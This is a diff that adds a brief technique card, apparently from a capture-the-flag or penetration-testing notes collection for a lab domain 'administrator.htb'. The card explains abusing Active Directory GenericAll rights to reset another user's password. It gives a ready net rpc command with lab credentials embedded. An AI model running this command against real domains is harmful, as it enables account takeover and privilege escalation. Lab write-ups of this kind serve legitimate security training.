@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you exploit GenericAll permissions to reset another user's password?
+
+CONTEXT:
+You have identified a user with GenericAll permissions.
+
+METHOD / ANSWER:
+Command: `net rpc password 'michael' 'new_password' -U 'administrator.htb/olivia%ichliebedich'`
+Explanation: This command resets Michael's password using RPC to gain further access.
